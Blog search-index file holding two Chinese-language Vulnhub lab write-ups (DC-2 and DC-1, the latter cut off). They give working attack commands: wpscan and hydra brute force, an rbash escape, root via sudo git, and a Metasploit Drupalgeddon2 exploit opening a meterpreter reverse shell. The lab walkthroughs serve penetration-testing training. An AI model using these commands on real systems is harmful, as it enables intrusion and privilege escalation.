<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Vulnhub-DC-2-Writeup</title>
    <link href="/2020/11/30/Vulnhub-DC-2-Writeup/"/>
    <url>/2020/11/30/Vulnhub-DC-2-Writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="Vunhub-DC-2-Writeup"><a href="#Vunhub-DC-2-Writeup" class="headerlink" title="Vunhub DC-2 Writeup"></a>Vunhub DC-2 Writeup</h1><h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><p><a href="https://www.vulnhub.com/entry/dc-2,311/" target="_blank" rel="noopener">DC: 2 ~ VulnHub</a></p><p>一共是5个flag</p><blockquote><p>Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p><p>As with the original DC-1, it’s designed with beginners in mind.</p><p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p><p>Just like with DC-1, there are five flags including the final flag.</p><p>And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.</p><p>In short, the only flag that really counts, is the final flag.</p><p>For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.</p><p>I haven’t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.</p></blockquote><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># nmap 10.0.2.5 -A -sC -sV -p 1-65535</span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-30 05:55 ESTNmap scan report <span class="hljs-keyword">for</span> 10.0.2.5Host is up (0.00040s latency).Not shown: 65533 closed portsPORT     STATE SERVICE VERSION80/tcp   open  http    Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Did not follow redirect to http://dc-2/|_https-redirect: ERROR: Script execution failed (use -d to debug)7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)| ssh-hostkey: |   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)MAC Address: 08:00:27:8A:91:38 (Oracle VirtualBox virtual NIC)Device <span class="hljs-built_in">type</span>: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.40 ms 10.0.2.5</code></pre><h2 id="80端口（flag1）"><a href="#80端口（flag1）" class="headerlink" title="80端口（flag1）"></a>80端口（flag1）</h2><p>显示连接超时,观察到地址栏有些奇怪，本来是IP地址的，变成了 <a href="http://dc-2/" target="_blank" rel="noopener">http://dc-2/</a></p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201130191707.png" srcset="/img/loading.gif" alt=""></p><p>因为DC-2是在局域网内的所以需要改<code>hosts</code>文件</p><blockquote><p>/etc/hosts：主机名查询静态表，是ip地址与域名快速解析的文件。ip地址与主机名之间的映射，包括主机的别名。</p><p>通常将常用的域名和ip地址映射加入到hosts文件中，实现快速方便的访问。</p></blockquote><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201130193039.png" srcset="/img/loading.gif" alt=""></p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201130211613.png" srcset="/img/loading.gif" alt=""></p><p>进入网站就可以看到flag1了</p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201130211647.png" srcset="/img/loading.gif" alt=""></p><p>关键词是wordlist（字典），cewl（一共工具）</p><blockquote><p>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</p></blockquote><p>提示应该是在说，登陆的穷举，你的字典应该是没用的了，需要用cwel去生成关键词词典去暴力破解，下一个flag需要登陆才可以获取</p><p>而且外卖可以在网站的底部发现一行：<strong>Proudly powered by WordPress</strong> </p><p>那么这个网站应该是<code>wordpress</code>搭建，我们先来看看登陆目录吧，先扫一下目录</p><h2 id="dirb穷举目录"><a href="#dirb穷举目录" class="headerlink" title="dirb穷举目录"></a>dirb穷举目录</h2><p>一下子就找到入口了,是默认的管理登陆路径</p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201205162841.png" srcset="/img/loading.gif" alt=""></p><h2 id="wpscan穷举账号"><a href="#wpscan穷举账号" class="headerlink" title="wpscan穷举账号"></a>wpscan穷举账号</h2><blockquote><p><code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，它可以为所有 <code>Web</code> 开发人员扫描 <code>WordPress</code> 漏洞并在他们开发前找到并解决问题。</p></blockquote><p>这里使用wpscan可以穷举出账号</p><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># wpscan --url http://dc-2/ -e u</span></code></pre><p>wp版本信息</p><pre><code class="hljs angelscript">[+] WordPress version <span class="hljs-number">4.7</span><span class="hljs-number">.10</span> identified (Insecure, released on <span class="hljs-number">2018</span><span class="hljs-number">-04</span><span class="hljs-number">-03</span>).</code></pre><p>一共三个账号</p><pre><code class="hljs bash">[+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] jerry | Found By: Wp Json Api (Aggressive Detection) |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Confirmed By: |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] tom | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</code></pre><h2 id="cewl生成密码字典"><a href="#cewl生成密码字典" class="headerlink" title="cewl生成密码字典"></a>cewl生成密码字典</h2><pre><code class="hljs bash">root@kali:~/DC<span class="hljs-comment"># cewl http://dc-2/ -w dc2pass.txt</span></code></pre><p>写用户名文件</p><pre><code class="hljs bash">root@kali:~/DC<span class="hljs-comment"># vim dc2user.txt</span></code></pre><pre><code class="hljs bash">root@kali:~/DC<span class="hljs-comment"># ls</span>dc2pass.txt  dc2user.txt</code></pre><h2 id="wpscan穷举攻击（flag2）"><a href="#wpscan穷举攻击（flag2）" class="headerlink" title="wpscan穷举攻击（flag2）"></a>wpscan穷举攻击（flag2）</h2><pre><code class="hljs bash">root@kali:~/DC<span class="hljs-comment"># wpscan --url http://dc-2/ -P dc2pass.txt -U dc2user.txt</span></code></pre><p>字典和用户不多，大概需要两分钟左右，除了admin的账户，另外两个的密码均被穷举出来</p><pre><code class="hljs bash">[SUCCESS] - jerry / adipiscing                                                        [SUCCESS] - tom / parturient</code></pre><p>尝试登陆两个账户寻找有用信息,在jerry里找到flag2。提示我们wp方向如果走不下去，就试试其他方式，还有ssh</p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201130223355.png" srcset="/img/loading.gif" alt=""></p><h2 id="hydra穷举ssh（7744端口flag3）"><a href="#hydra穷举ssh（7744端口flag3）" class="headerlink" title="hydra穷举ssh（7744端口flag3）"></a>hydra穷举ssh（7744端口flag3）</h2><p>只找到了一个，登陆它</p><pre><code class="hljs bash">root@kali:~/DC<span class="hljs-comment"># hydra -L dc2user.txt -P dc2pass.txt ssh://10.0.2.5:7744 -f -vV</span></code></pre><pre><code class="hljs markdown">[<span class="hljs-string">7744</span>][<span class="hljs-symbol">ssh</span>] host: 10.0.2.5   login: tom   password: parturient</code></pre><pre><code class="hljs bash">root@kali:~/DC<span class="hljs-comment"># ssh tom@10.0.2.5 -p 7744</span>Warning: Permanently added <span class="hljs-string">'[10.0.2.5]:7744'</span> (ECDSA) to the list of known hosts.tom@10.0.2.5<span class="hljs-string">'s password: The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue Aug  4 22:40:40 2020 from 192.168.0.108</span></code></pre><p>发现许多命令不可以使用，原因是rbash限制，需要逃逸rbash</p><pre><code class="hljs bash">tom@DC-2:~$ whoami-rbash: whoami: <span class="hljs-built_in">command</span> not foundtom@DC-2:~$ id-rbash: id: <span class="hljs-built_in">command</span> not foundtom@DC-2:~$ lsflag3.txt  flag.txt  usrtom@DC-2:~$ <span class="hljs-built_in">cd</span> usr-rbash: <span class="hljs-built_in">cd</span>: restricted</code></pre><blockquote><p><strong>受限shell</strong>是LinuxShell限制一些bash shell中的功能，并且是从名字上很清楚。 该限制很好地实现了命令以及脚本在受限shell中运行。 它为Linux中的bash shell提供了一个额外的安全层。</p></blockquote><h3 id="vi绕过rbash"><a href="#vi绕过rbash" class="headerlink" title="vi绕过rbash"></a>vi绕过rbash</h3><ol><li>vi</li><li>:set shell=/bin/shell</li><li>:shell</li></ol><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>其实，在探索rbash的过程中发现less可以使用，flag里面没有内容，flag3拿到</p><pre><code class="hljs bash">tom@DC-2:~$ less flag.txttom@DC-2:~$ less flag3.txt</code></pre><p><strong>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</strong></p><p>提示的意思应该是，Tom的权限比Jerry小，<strong>应该su提权</strong>。但是当前无法使用su命令</p><h2 id="提权到jerry"><a href="#提权到jerry" class="headerlink" title="提权到jerry"></a>提权到jerry</h2><p>这时我们需要知道su命令是无法使用的，所以我们无法<strong>提权到jerry用户</strong>，我们先来看看我们现在可以执行那些命令</p><pre><code class="hljs bash">tom@DC-2:~$ <span class="hljs-variable">$PATH</span>bash: /home/tom/usr/bin: Is a directorytom@DC-2:~$ <span class="hljs-built_in">cd</span> /home/tom/usr/bintom@DC-2:~/usr/bin$ lsless  ls  scp  vi</code></pre><p>可以看到我只能执行四个命令，所以要设置新的$PATH变量才可以使用其他的命令，相当于我们还没有从rbash逃逸出来</p><blockquote><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># echo $PATH</span>/usr/<span class="hljs-built_in">local</span>/sbin:/usr/sbin:/sbin:/usr/<span class="hljs-built_in">local</span>/bin:/usr/bin:/bin:/root/bin</code></pre><p>这里的 echo 命令用来输出 PATH 环境变量的值（这里的 $ 是 PATH 的前缀符号），PATH 环境变量的内容是由一堆目录组成的，各目录之间用冒号“:”隔开。</p><p>当执行某个命令时，Linux 会依照 PATH 中包含的目录依次搜寻该命令的可执行文件，一旦找到，即正常执行；反之，则提示无法找到该命令。</p></blockquote><p>我们重新设置环境变量并查看</p><pre><code class="hljs bash">tom@DC-2:~$ <span class="hljs-built_in">export</span> PATH=PATH:/bin:/sbin:/usr/bin:/usr/sbintom@DC-2:~$ <span class="hljs-variable">$PATH</span>bash: PATH:/bin:/sbin:/usr/bin:/usr/sbin: No such file or directory</code></pre><blockquote><p><strong>/bin目录:</strong> </p><p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。</p><p><strong>/usr/bin目录:</strong></p><p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome<em>、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb</em>、wget等。</p><p><strong>/sbin目录:</strong> </p><p>主要放置一些系统管理的必备程序例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。</p><p><strong>/usr/sbin目录:</strong> </p><p>放置一些网路管理的必备程序例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等</p></blockquote><p>这样我们就可以执行这些环境里面所有的命令了，可以使用su提权到jerry</p><pre><code class="hljs bash">tom@DC-2:~$ su jerryPassword: jerry@DC-2:/home/tom$ whoamijerry</code></pre><p>然后进入jerry的用户目录，可以发现flag4了</p><pre><code class="hljs bash">jerry@DC-2:/home/tom$ lsls: cannot open directory .: Permission deniedjerry@DC-2:/home/tom$ <span class="hljs-built_in">cd</span> ..jerry@DC-2:/home$ lsjerry  tomjerry@DC-2:/home$ <span class="hljs-built_in">cd</span> jerry/jerry@DC-2:~$ lsflag4.txtjerry@DC-2:~$ cat flag4.txt Good to see that you<span class="hljs-string">'ve made it this far - but you'</span>re not home yet. You still need to get the final flag (the only flag that really counts!!!).  No hints here - you<span class="hljs-string">'re on your own now.  :-)Go on - git outta here!!!!</span></code></pre><p>flag4的提示是说要用git，应该是最后的flag需要用git这个命令去提权到root</p><h2 id="git提权（final-flag）"><a href="#git提权（final-flag）" class="headerlink" title="git提权（final-flag）"></a>git提权（final-flag）</h2><p>这里的sudo -l的意思是，sudo git不需要输入密码直接使用，而其他的（sudo command）需要输入root密码使用</p><pre><code class="hljs bash">jerry@DC-2:~$ sudo -lMatching Defaults entries <span class="hljs-keyword">for</span> jerry on DC-2:    env_reset, mail_badpass, secure_path=/usr/<span class="hljs-built_in">local</span>/sbin\:/usr/<span class="hljs-built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser jerry may run the following commands on DC-2:    (root) NOPASSWD: /usr/bin/git</code></pre><blockquote><p>sudo</p><p>-l, –list                  list user’s privileges or check a specific command; use twice for longer format</p><p>显示出自己（执行 sudo 的使用者）的权限</p></blockquote><pre><code class="hljs bash">jerry@DC-2:~$ sudo git <span class="hljs-built_in">help</span> configroot@DC-2:/home/jerry<span class="hljs-comment"># id</span>uid=0(root) gid=0(root) groups=0(root)</code></pre><blockquote><p><strong>sudo git help config</strong> </p><p><strong>!/bin/bash</strong>或者！’sh’完成提权 </p><p>sudo git  -p help !/bin/bash</p></blockquote><p>拿到最后的flag</p><pre><code class="hljs bash">root@DC-2:~<span class="hljs-comment"># cat final-flag.txt </span> __    __     _ _       _                    _ / / /\ \ \___| | |   __| | ___  _ __   ___  / \\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="hljs-string">'_ \ / _ \/  / \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/   \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   Congratulatons!!!A special thanks to all those who sent me tweetsand provided me with feedback - it'</span>s all greatlyappreciated.If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub DC-1 Writeup</title>
    <link href="/2020/11/17/Vulnhub-DC-1-Writeup/"/>
    <url>/2020/11/17/Vulnhub-DC-1-Writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="Vunhub-DC-1-Writeup"><a href="#Vunhub-DC-1-Writeup" class="headerlink" title="Vunhub DC-1 Writeup"></a>Vunhub DC-1 Writeup</h1><h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><p><a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank" rel="noopener">（官方地址）</a></p><p>提示一共有5个flag,最好还要拿到root</p><blockquote><p>DESCRIPTION<br>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p><p>It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</p><p>To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</p><p>There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.</p><p>There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this, however, you will require root privileges.</p><p>Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</p><p>Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</p></blockquote><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201117150857.png" srcset="/img/loading.gif" alt=""></p><h2 id="nmap发现DC-1主机-全面扫描主机"><a href="#nmap发现DC-1主机-全面扫描主机" class="headerlink" title="nmap发现DC-1主机,全面扫描主机"></a>nmap发现DC-1主机,全面扫描主机</h2><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># nmap 192.168.43.*</span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 01:57 ESTNmap scan report <span class="hljs-keyword">for</span> 192.168.43.165Host is up (0.00016s latency).Not shown: 997 closed portsPORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http111/tcp open  rpcbindMAC Address: 08:00:27:34:B3:8F (Oracle VirtualBox virtual NIC)</code></pre><h3 id="nmap详细扫描"><a href="#nmap详细扫描" class="headerlink" title="nmap详细扫描"></a>nmap详细扫描</h3><p>可以看到有80和22端口,接下来我们从80端口入手</p><pre><code class="hljs shell">root@kali:~# nmap 192.168.43.165 -A -sV -sC -p 1-65535Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 02:04 ESTNmap scan report for 192.168.43.165Host is up (0.00026s latency).Not shown: 65531 closed portsPORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)| ssh-hostkey: |   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)80/tcp    open  http    Apache httpd 2.2.22 ((Debian))|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache/2.2.22 (Debian)|_http-title: Welcome to Drupal Site | Drupal Site111/tcp   open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100024  1          37330/tcp6  status|   100024  1          37494/tcp   status|   100024  1          51572/udp   status|_  100024  1          57636/udp6  status37494/tcp open  status  1 (RPC #100024)MAC Address: 08:00:27:34:B3:8F (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.XOS CPE: cpe:/o:linux:linux_kernel:3OS details: Linux 3.2 - 3.16Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.26 ms 192.168.43.165OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 23.82 seconds</code></pre><p>看80端口是什么样子的</p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201117153044.png" srcset="/img/loading.gif" alt=""></p><p>可以看到有一个登陆界面</p><h2 id="whatweb扫描网页的CMS指纹"><a href="#whatweb扫描网页的CMS指纹" class="headerlink" title="whatweb扫描网页的CMS指纹"></a>whatweb扫描网页的CMS指纹</h2><pre><code class="hljs shell">root@kali:~# whatweb http://192.168.43.165/http://192.168.43.165/ [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.43.165], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]</code></pre><p>CMS是Drupal 7，接下来尝试看看msfconsole</p><h2 id="方法1-80端口"><a href="#方法1-80端口" class="headerlink" title="方法1(80端口)"></a>方法1(80端口)</h2><h3 id="msfconsole搜索drupal的模块"><a href="#msfconsole搜索drupal的模块" class="headerlink" title="msfconsole搜索drupal的模块"></a>msfconsole搜索drupal的模块</h3><pre><code class="hljs bash">msf5 &gt; search drupal target:7.xMatching Modules================   <span class="hljs-comment">#  Name                                      Disclosure Date  Rank       Check  Description</span>   -  ----                                      ---------------  ----       -----  -----------   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</code></pre><p>搜索到一个exploit，查看一下这个exploit的info(具体信息),看得info里面的target信息有对应的版本</p><p>  4   Drupal 7.x (PHP In-Memory)<br>  5   Drupal 7.x (PHP Dropper)<br>  6   Drupal 7.x (Unix In-Memory)<br>  7   Drupal 7.x (Linux Dropper)</p><pre><code class="hljs bash">msf5 &gt; info exploit/unix/webapp/drupal_drupalgeddon2       Name: Drupal Drupalgeddon 2 Forms API Property Injection     Module: exploit/unix/webapp/drupal_drupalgeddon2   Platform: PHP, Unix, Linux       Arch: php, cmd, x86, x64 Privileged: No    License: Metasploit Framework License (BSD)       Rank: Excellent  Disclosed: 2018-03-28Provided by:  Jasper Mattsson  a2u  Nixawk  FireFart  wvu &lt;wvu@metasploit.com&gt;Available targets:  Id  Name  --  ----  0   Automatic (PHP In-Memory)  1   Automatic (PHP Dropper)  2   Automatic (Unix In-Memory)  3   Automatic (Linux Dropper)  4   Drupal 7.x (PHP In-Memory)  5   Drupal 7.x (PHP Dropper)  6   Drupal 7.x (Unix In-Memory)  7   Drupal 7.x (Linux Dropper)  8   Drupal 8.x (PHP In-Memory)  9   Drupal 8.x (PHP Dropper)  10  Drupal 8.x (Unix In-Memory)  11  Drupal 8.x (Linux Dropper)Check supported:  YesBasic options:  Name         Current Setting  Required  Description  ----         ---------------  --------  -----------  DUMP_OUTPUT  <span class="hljs-literal">false</span>            no        Dump payload <span class="hljs-built_in">command</span> output  PHP_FUNC     passthru         yes       PHP <span class="hljs-keyword">function</span> to execute  Proxies                       no        A proxy chain of format <span class="hljs-built_in">type</span>:host:port[,<span class="hljs-built_in">type</span>:host:port][...]  RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">'file:&lt;path&gt;'</span>  RPORT        80               yes       The target port (TCP)  SSL          <span class="hljs-literal">false</span>            no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections  TARGETURI    /                yes       Path to Drupal install  VHOST                         no        HTTP server virtual hostPayload information:  Avoid: 3 charactersDescription:  This module exploits a Drupal property injection <span class="hljs-keyword">in</span> the Forms API.   Drupal 6.x, &lt; 7.58, 8.2.x, &lt; 8.3.9, &lt; 8.4.6, and &lt; 8.5.1 are   vulnerable.References:  https://cvedetails.com/cve/CVE-2018-7600/  https://www.drupal.org/sa-core-2018-002  https://greysec.net/showthread.php?tid=2912  https://research.checkpoint.com/uncovering-drupalgeddon-2/  https://github.com/a2u/CVE-2018-7600  https://github.com/nixawk/labs/issues/19  https://github.com/FireFart/CVE-2018-7600Also known as:  SA-CORE-2018-002  Drupalgeddon 2</code></pre><p>尝试使用这个exploit，首先要设置option，这里只需要set rhost，再run一下(可能不会成功,只是尝试)</p><pre><code class="hljs bash">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> rhosts 192.168.43.165rhosts =&gt; 192.168.43.165msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; options Module options (exploit/unix/webapp/drupal_drupalgeddon2):   Name         Current Setting  Required  Description   ----         ---------------  --------  -----------   DUMP_OUTPUT  <span class="hljs-literal">false</span>            no        Dump payload <span class="hljs-built_in">command</span> output   PHP_FUNC     passthru         yes       PHP <span class="hljs-keyword">function</span> to execute   Proxies                       no        A proxy chain of format <span class="hljs-built_in">type</span>:host:port[,<span class="hljs-built_in">type</span>:host:port][...]   RHOSTS       192.168.43.165   yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">'file:&lt;path&gt;'</span>   RPORT        80               yes       The target port (TCP)   SSL          <span class="hljs-literal">false</span>            no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections   TARGETURI    /                yes       Path to Drupal install   VHOST                         no        HTTP server virtual hostPayload options (php/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  192.168.43.225   yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Automatic (PHP In-Memory)msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run[*] Started reverse TCP handler on 192.168.43.225:4444 [*] Sending stage (38288 bytes) to 192.168.43.165[*] Meterpreter session 1 opened (192.168.43.225:4444 -&gt; 192.168.43.165:35033) at 2020-11-25 06:35:32 -0500meterpreter &gt;</code></pre><p>msfconsole就会返回一个shell？尝试ls命令,ls命令可以使用</p><pre><code class="hljs bash">meterpreter &gt; lsListing: /var/www=================Mode              Size   Type  Last modified              Name----              ----   ----  -------------              ----100600/rw-------  567    fil   2020-11-20 10:05:39 -0500  .bash_history100644/rw-r--r--  174    fil   2013-11-20 15:45:59 -0500  .gitignore100644/rw-r--r--  5767   fil   2013-11-20 15:45:59 -0500  .htaccess100644/rw-r--r--  1481   fil   2013-11-20 15:45:59 -0500  COPYRIGHT.txt100644/rw-r--r--  1451   fil   2013-11-20 15:45:59 -0500  INSTALL.mysql.txt100644/rw-r--r--  1874   fil   2013-11-20 15:45:59 -0500  INSTALL.pgsql.txt100644/rw-r--r--  1298   fil   2013-11-20 15:45:59 -0500  INSTALL.sqlite.txt100644/rw-r--r--  17861  fil   2013-11-20 15:45:59 -0500  INSTALL.txt100755/rwxr-xr-x  18092  fil   2013-11-01 06:14:15 -0400  LICENSE.txt100644/rw-r--r--  8191   fil   2013-11-20 15:45:59 -0500  MAINTAINERS.txt100644/rw-r--r--  5376   fil   2013-11-20 15:45:59 -0500  README.txt100644/rw-r--r--  9642   fil   2013-11-20 15:45:59 -0500  UPGRADE.txt100644/rw-r--r--  6604   fil   2013-11-20 15:45:59 -0500  authorize.php100644/rw-r--r--  720    fil   2013-11-20 15:45:59 -0500  cron.php100644/rw-r--r--  52     fil   2019-02-19 08:20:46 -0500  flag1.txt40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  includes100644/rw-r--r--  529    fil   2013-11-20 15:45:59 -0500  index.php100644/rw-r--r--  703    fil   2013-11-20 15:45:59 -0500  install.php40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  misc40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  modules40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  profiles100644/rw-r--r--  1561   fil   2013-11-20 15:45:59 -0500  robots.txt40755/rwxr-xr-x   4096   dir   2020-11-19 05:34:49 -0500  scripts40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  sites40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  themes100644/rw-r--r--  19941  fil   2013-11-20 15:45:59 -0500  update.php100644/rw-r--r--  2178   fil   2013-11-20 15:45:59 -0500  web.config100644/rw-r--r--  417    fil   2013-11-20 15:45:59 -0500  xmlrpc.php</code></pre><p>可是连一个whoami都用不了</p><pre><code class="hljs bash">meterpreter &gt; whoami[-] Unknown <span class="hljs-built_in">command</span>: whoami.</code></pre><p>输入shell进入一个？？？,这里可以用whoami了</p><pre><code class="hljs bash">meterpreter &gt; shellProcess 3100 created.Channel 0 created.lsCOPYRIGHT.txtINSTALL.mysql.txtINSTALL.pgsql.txtINSTALL.sqlite.txtINSTALL.txtLICENSE.txtMAINTAINERS.txtREADME.txtUPGRADE.txtauthorize.phpcron.phpflag1.txtincludesindex.phpinstall.phpmiscmodulesprofilesrobots.txtscriptssitesthemesupdate.phpweb.configxmlrpc.phpwhoami www-data</code></pre><p>但是有些命令不可以用，比如su命令就明确说我们的这个不是来自terminal的命令</p><pre><code class="hljs bash">sudo/bin/sh: 7: sudo: not foundvim/bin/sh: 8: vim: not foundsusu: must be run from a terminal</code></pre><p>而且，按住ctrl+c会停止这个反弹的shell，也就是说这个shell不够完美</p><pre><code class="hljs bash">^CTerminate channel 0? [y/N]  [-] core_channel_interact: Operation failed: 1</code></pre><h3 id="python将简单的Shell转换成为完全交互式的TTY"><a href="#python将简单的Shell转换成为完全交互式的TTY" class="headerlink" title="python将简单的Shell转换成为完全交互式的TTY"></a>python将简单的Shell转换成为完全交互式的TTY</h3><pre><code class="hljs bash">python -c <span class="hljs-string">'import pty; pty.spawn("/bin/bash")'</span></code></pre><pre><code class="hljs bash">www-data@DC-1:/var/www$ ls -lls -ltotal 168-rw-r--r--  1 www-data www-data  1481 Nov 21  2013 COPYRIGHT.txt-rw-r--r--  1 www-data www-data  1451 Nov 21  2013 INSTALL.mysql.txt-rw-r--r--  1 www-data www-data  1874 Nov 21  2013 INSTALL.pgsql.txt-rw-r--r--  1 www-data www-data  1298 Nov 21  2013 